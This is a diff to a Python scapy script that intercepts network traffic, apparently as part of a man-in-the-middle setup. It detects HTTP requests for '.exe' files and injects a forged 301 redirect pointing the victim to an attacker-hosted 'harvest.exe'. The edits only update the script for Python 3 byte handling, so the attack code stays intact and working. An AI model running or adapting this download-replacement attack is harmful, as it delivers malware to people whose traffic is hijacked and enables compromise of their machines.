@@ -18,7 +18,7 @@ def process_packet(packet):
     if my_packet.haslayer(scapy.Raw):
         if my_packet[scapy.TCP].dport == 80:
             ack_list.append(my_packet[scapy.tcp].ack)
-            if ".exe" in my_packet[scapy.Raw].load:
+            if ".exe" in my_packet[scapy.Raw].load.decode():
                 print("[+] .exe Request file requested")
 
         elif my_packet[scapy.TCP].sport == 80:
@@ -28,7 +28,7 @@ def process_packet(packet):
                 modified_packet = set_load(my_packet, "HTTP/1.1 301 Moved Permanently\nLocation: "
                                                       "https://192.168.x.y/havesters/harvest.exe\n ")
 
-                packet.set_payload(str(modified_packet))
+                packet.set_payload(bytes(modified_packet))
 
     packet.accept()
 
